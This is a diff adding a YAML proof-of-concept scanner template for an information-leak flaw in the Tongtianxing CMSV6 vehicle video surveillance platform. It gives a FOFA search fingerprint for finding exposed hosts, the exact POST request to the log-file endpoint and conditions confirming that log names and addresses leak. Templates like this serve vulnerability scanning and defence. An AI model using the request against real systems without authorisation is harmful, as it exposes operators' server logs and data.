@@ -1,0 +1,27 @@
+id: poc-yaml-g-sky-cmsv6-selectdevaction-loadserverloggerfile-info-leak
+info:
+  name: 通天星CMS V6车载视频监控平台 SelectDevAction_loadServerLoggerFile 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: cmsv6
+  fofa: body="./open/webApi.html"
+requests:
+- method: POST
+  path: /808gps/LoggerManagement/SelectDevAction_loadServerLoggerFile.action
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: page=1&rp=15&query=&qtype=&pagin=%257B%2522currentPage%2522%253A1%252C%2522pageRecords%2522%253A15%257D
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"fileName\":") &&
+
+    contains(body,".log") &&
+
+    contains(body,"\"address\":") &&
+
+    contains(content_type,"application/json")
+
+    '
+variables: {}
+transport: http
